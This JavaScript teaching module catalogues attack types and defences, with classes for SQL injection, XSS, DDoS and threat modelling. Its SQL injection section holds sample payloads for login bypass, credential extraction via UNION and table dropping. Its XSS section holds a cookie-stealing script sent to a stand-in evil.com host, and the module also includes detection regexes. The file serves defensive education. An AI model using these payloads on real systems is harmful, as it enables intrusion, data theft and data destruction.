/**
 * Security Attacks - Understanding Threats to Defend Against Them
 *
 * Security attacks refer to any deliberate action taken to compromise the
 * confidentiality, integrity, or availability of a system. Attacks can target
 * hardware, software, or data. Understanding attack vectors is essential for
 * building effective defenses and conducting security testing.
 *
 * Key Concepts:
 * - Confidentiality, Integrity, Availability (CIA)
 * - Attack vectors and methods
 * - Threat modeling and assessment
 * - Defense strategies
 */

/**
 * AttackCategory organizes attacks by type.
 */
class AttackCategory {
    static categories = {
        injection: {
            name: 'Injection Attacks',
            description: 'Inserting malicious data into queries or commands',
            examples: ['SQL Injection', 'Command Injection', 'LDAP Injection'],
            targetedAsset: 'Data integrity and confidentiality',
            defenses: ['Input validation', 'Parameterized queries', 'Least privilege']
        },
        authentication: {
            name: 'Authentication Attacks',
            description: 'Attempting to bypass or compromise authentication',
            examples: ['Brute force', 'Credential stuffing', 'Password spraying'],
            targetedAsset: 'Access control',
            defenses: ['Strong passwords', 'MFA', 'Account lockout', 'Rate limiting']
        },
        xss: {
            name: 'Cross-Site Scripting (XSS)',
            description: 'Injecting malicious scripts into web pages',
            examples: ['Stored XSS', 'Reflected XSS', 'DOM-based XSS'],
            targetedAsset: 'User sessions, data theft',
            defenses: ['Output encoding', 'Content Security Policy', 'Input validation']
        },
        socialEngineering: {
            name: 'Social Engineering',
            description: 'Manipulating people to divulge information or take actions',
            examples: ['Phishing', 'Pretexting', 'Baiting', 'Tailgating'],
            targetedAsset: 'Human trust',
            defenses: ['Security awareness training', 'Verification procedures']
        },
        networkBased: {
            name: 'Network-Based Attacks',
            description: 'Attacking network infrastructure and communications',
            examples: ['Man-in-the-middle', 'DDoS', 'ARP spoofing', 'DNS poisoning'],
            targetedAsset: 'Network availability and integrity',
            defenses: ['Encryption', 'Network monitoring', 'DDoS protection']
        },
        malware: {
            name: 'Malware Attacks',
            description: 'Using malicious software to compromise systems',
            examples: ['Viruses', 'Ransomware', 'Trojans', 'Worms'],
            targetedAsset: 'System integrity and availability',
            defenses: ['Antivirus', 'Sandboxing', 'User education', 'Patching']
        }
    };

    /**
     * Gets category by name
     * @param {string} name - Category name
     * @returns {Object} Category details
     */
    static getCategory(name) {
        return this.categories[name];
    }

    /**
     * Gets all categories
     * @returns {Array} All categories
     */
    static getAllCategories() {
        return Object.entries(this.categories).map(([key, value]) => ({
            id: key,
            ...value
        }));
    }
}

/**
 * AttackVector represents a specific attack method.
 */
class AttackVector {
    constructor(options) {
        this.name = options.name;
        this.category = options.category;
        this.description = options.description;
        this.severity = options.severity || 'medium';
        this.difficulty = options.difficulty || 'medium';
        this.prerequisites = options.prerequisites || [];
        this.steps = options.steps || [];
        this.indicators = options.indicators || [];
        this.mitigations = options.mitigations || [];
    }

    /**
     * Gets attack profile
     * @returns {Object} Profile
     */
    getProfile() {
        return {
            name: this.name,
            category: this.category,
            severity: this.severity,
            difficulty: this.difficulty,
            riskScore: this.calculateRiskScore(),
            mitigations: this.mitigations
        };
    }

    /**
     * Calculates risk score
     * @returns {number} Risk score 1-10
     */
    calculateRiskScore() {
        const severityScores = { critical: 10, high: 8, medium: 5, low: 2 };
        const difficultyMultipliers = { easy: 1.5, medium: 1.0, hard: 0.5 };

        const base = severityScores[this.severity] || 5;
        const multiplier = difficultyMultipliers[this.difficulty] || 1.0;

        return Math.min(10, Math.round(base * multiplier));
    }
}

/**
 * SQLInjection demonstrates SQL injection attack patterns.
 */
class SQLInjection {
    static patterns = {
        basicBypass: {
            name: 'Authentication Bypass',
            payload: "' OR '1'='1",
            description: 'Bypasses login by making condition always true',
            vulnerable: "SELECT * FROM users WHERE user='" + "input" + "' AND pass='" + "input" + "'",
            impact: 'Unauthorized access'
        },
        unionBased: {
            name: 'UNION-based Extraction',
            payload: "' UNION SELECT username,password FROM users--",
            description: 'Extracts data from other tables',
            impact: 'Data theft'
        },
        timeBased: {
            name: 'Time-based Blind',
            payload: "'; WAITFOR DELAY '0:0:5'--",
            description: 'Infers data through response timing',
            impact: 'Data enumeration'
        },
        stackedQueries: {
            name: 'Stacked Queries',
            payload: "'; DROP TABLE users;--",
            description: 'Executes additional queries',
            impact: 'Data destruction'
        }
    };

    /**
     * Gets defense strategies
     * @returns {Array} Defenses
     */
    static getDefenses() {
        return [
            {
                defense: 'Parameterized Queries',
                description: 'Use prepared statements with bound parameters',
                example: 'db.query("SELECT * FROM users WHERE id = ?", [userId])',
                effectiveness: 'high'
            },
            {
                defense: 'Input Validation',
                description: 'Validate and sanitize all user input',
                example: 'Reject input containing SQL metacharacters',
                effectiveness: 'medium'
            },
            {
                defense: 'Least Privilege',
                description: 'Database user should have minimal permissions',
                example: 'App user cannot DROP tables',
                effectiveness: 'medium'
            },
            {
                defense: 'Web Application Firewall',
                description: 'Filter known SQL injection patterns',
                example: 'Block requests containing UNION SELECT',
                effectiveness: 'medium'
            }
        ];
    }

    /**
     * Tests if input appears malicious
     * @param {string} input - User input
     * @returns {Object} Analysis
     */
    static analyzeInput(input) {
        const patterns = [
            { pattern: /['"]\s*(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i, name: 'Boolean-based' },
            { pattern: /UNION\s+SELECT/i, name: 'UNION-based' },
            { pattern: /;\s*(DROP|DELETE|UPDATE|INSERT)/i, name: 'Stacked queries' },
            { pattern: /(WAITFOR|SLEEP|BENCHMARK)/i, name: 'Time-based' },
            { pattern: /--\s*$|#\s*$/m, name: 'Comment termination' }
        ];

        const detected = patterns.filter(p => p.pattern.test(input));

        return {
            suspicious: detected.length > 0,
            patternsDetected: detected.map(p => p.name),
            recommendation: detected.length > 0
                ? 'Block request and log for investigation'
                : 'Input appears safe'
        };
    }
}

/**
 * XSSAttack demonstrates cross-site scripting patterns.
 */
class XSSAttack {
    static types = {
        stored: {
            name: 'Stored XSS',
            description: 'Malicious script stored in database, served to users',
            example: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
            persistence: 'Permanent until removed',
            impact: 'Affects all users viewing the content'
        },
        reflected: {
            name: 'Reflected XSS',
            description: 'Malicious script reflected from URL parameter',
            example: 'https://site.com/search?q=<script>alert(1)</script>',
            persistence: 'Per-request',
            impact: 'Affects users clicking malicious links'
        },
        domBased: {
            name: 'DOM-based XSS',
            description: 'Client-side script modifies DOM unsafely',
            example: 'document.write(location.hash.substring(1))',
            persistence: 'Per-request',
            impact: 'No server involvement, harder to detect'
        }
    };

    /**
     * Gets defense strategies
     * @returns {Array} Defenses
     */
    static getDefenses() {
        return [
            {
                defense: 'Output Encoding',
                description: 'Encode data before inserting into HTML',
                contexts: ['HTML body', 'HTML attributes', 'JavaScript', 'CSS', 'URLs'],
                effectiveness: 'high'
            },
            {
                defense: 'Content Security Policy',
                description: 'Restrict script sources via HTTP header',
                example: "Content-Security-Policy: script-src 'self'",
                effectiveness: 'high'
            },
            {
                defense: 'HTTPOnly Cookies',
                description: 'Prevent JavaScript access to session cookies',
                example: 'Set-Cookie: session=abc; HttpOnly',
                effectiveness: 'medium'
            },
            {
                defense: 'Input Validation',
                description: 'Sanitize input, strip dangerous tags',
                example: 'Use allowlist of permitted HTML tags',
                effectiveness: 'medium'
            }
        ];
    }

    /**
     * Sanitizes HTML input
     * @param {string} input - Potentially dangerous input
     * @returns {string} Sanitized output
     */
    static sanitize(input) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;'
        };
        return input.replace(/[&<>"'/]/g, char => map[char]);
    }
}

/**
 * DDoSAttack demonstrates denial of service patterns.
 */
class DDoSAttack {
    static types = {
        volumetric: {
            name: 'Volumetric Attack',
            description: 'Overwhelms bandwidth with traffic',
            examples: ['UDP flood', 'ICMP flood', 'DNS amplification'],
            scale: 'Gbps to Tbps',
            mitigation: ['DDoS protection service', 'Traffic scrubbing']
        },
        protocol: {
            name: 'Protocol Attack',
            description: 'Exploits protocol weaknesses',
            examples: ['SYN flood', 'Ping of Death', 'Smurf attack'],
            target: 'Network layer',
            mitigation: ['SYN cookies', 'Rate limiting']
        },
        application: {
            name: 'Application Layer Attack',
            description: 'Targets application resources',
            examples: ['HTTP flood', 'Slowloris', 'API abuse'],
            target: 'Layer 7',
            mitigation: ['WAF', 'Rate limiting', 'Challenge-response']
        }
    };

    /**
     * Gets defense strategies
     * @returns {Array} Defenses
     */
    static getDefenses() {
        return [
            {
                layer: 'Edge',
                defenses: ['CDN', 'DDoS protection service', 'Anycast'],
                description: 'Absorb and filter traffic at the edge'
            },
            {
                layer: 'Network',
                defenses: ['Rate limiting', 'Blackholing', 'Traffic shaping'],
                description: 'Control traffic at network level'
            },
            {
                layer: 'Application',
                defenses: ['WAF', 'CAPTCHA', 'Bot detection'],
                description: 'Identify and block malicious requests'
            },
            {
                layer: 'Architecture',
                defenses: ['Auto-scaling', 'Load balancing', 'Redundancy'],
                description: 'Build resilience into architecture'
            }
        ];
    }
}

/**
 * ThreatModel helps assess security threats.
 */
class ThreatModel {
    constructor(systemName) {
        this.systemName = systemName;
        this.assets = [];
        this.threats = [];
        this.dataFlows = [];
    }

    /**
     * Adds an asset to protect
     * @param {Object} asset - Asset details
     */
    addAsset(asset) {
        this.assets.push({
            name: asset.name,
            type: asset.type,
            sensitivity: asset.sensitivity,
            location: asset.location
        });
    }

    /**
     * Adds a threat
     * @param {Object} threat - Threat details
     */
    addThreat(threat) {
        this.threats.push({
            id: `T${this.threats.length + 1}`,
            name: threat.name,
            category: threat.category,
            targetAsset: threat.targetAsset,
            likelihood: threat.likelihood,
            impact: threat.impact,
            mitigations: threat.mitigations || []
        });
    }

    /**
     * Calculates risk for each threat
     * @returns {Array} Risks
     */
    calculateRisks() {
        const likelihoodScores = { high: 3, medium: 2, low: 1 };
        const impactScores = { high: 3, medium: 2, low: 1 };

        return this.threats.map(threat => {
            const score = likelihoodScores[threat.likelihood] * impactScores[threat.impact];
            return {
                ...threat,
                riskScore: score,
                riskLevel: score >= 6 ? 'high' : score >= 3 ? 'medium' : 'low'
            };
        }).sort((a, b) => b.riskScore - a.riskScore);
    }

    /**
     * Gets threat model summary
     * @returns {Object} Summary
     */
    getSummary() {
        const risks = this.calculateRisks();
        return {
            system: this.systemName,
            assetsCount: this.assets.length,
            threatsCount: this.threats.length,
            highRiskThreats: risks.filter(r => r.riskLevel === 'high').length,
            topThreats: risks.slice(0, 3),
            recommendation: risks.some(r => r.riskLevel === 'high')
                ? 'Address high-risk threats immediately'
                : 'Continue monitoring and improving defenses'
        };
    }
}

// Demonstration
console.log('=== Security Attacks Demo ===\n');

// Attack categories
console.log('--- Attack Categories ---');
AttackCategory.getAllCategories().slice(0, 3).forEach(cat => {
    console.log(`\n${cat.name}:`);
    console.log(`  Description: ${cat.description}`);
    console.log(`  Examples: ${cat.examples.join(', ')}`);
});

// SQL Injection
console.log('\n--- SQL Injection ---');
console.log('Patterns:', Object.keys(SQLInjection.patterns));
console.log('Input analysis:', SQLInjection.analyzeInput("' OR '1'='1"));
console.log('Safe input:', SQLInjection.analyzeInput('john.doe@email.com'));

// XSS
console.log('\n--- Cross-Site Scripting ---');
console.log('Types:', Object.keys(XSSAttack.types));
console.log('Sanitization example:');
console.log('  Input:', '<script>alert(1)</script>');
console.log('  Output:', XSSAttack.sanitize('<script>alert(1)</script>'));

// DDoS
console.log('\n--- DDoS Attack Types ---');
Object.values(DDoSAttack.types).forEach(type => {
    console.log(`${type.name}: ${type.description}`);
});

// Threat Model
console.log('\n--- Threat Modeling ---');
const model = new ThreatModel('E-Commerce Platform');

model.addAsset({ name: 'Customer Data', type: 'data', sensitivity: 'high', location: 'database' });
model.addAsset({ name: 'Payment System', type: 'service', sensitivity: 'critical', location: 'backend' });

model.addThreat({
    name: 'SQL Injection on Login',
    category: 'injection',
    targetAsset: 'Customer Data',
    likelihood: 'medium',
    impact: 'high',
    mitigations: ['Parameterized queries', 'Input validation']
});

model.addThreat({
    name: 'XSS in Product Reviews',
    category: 'xss',
    targetAsset: 'Customer Data',
    likelihood: 'high',
    impact: 'medium',
    mitigations: ['Output encoding', 'CSP']
});

console.log('Threat Model Summary:', model.getSummary());

/**
 * Best Practices for Security Testing:
 *
 * 1. Understand common attack vectors and techniques
 * 2. Include security testing in the development lifecycle
 * 3. Use threat modeling to identify risks
 * 4. Test for OWASP Top 10 vulnerabilities
 * 5. Implement defense in depth
 * 6. Regularly update and patch systems
 * 7. Conduct penetration testing
 * 8. Monitor for security incidents
 * 9. Train developers on secure coding
 * 10. Have an incident response plan ready
 */
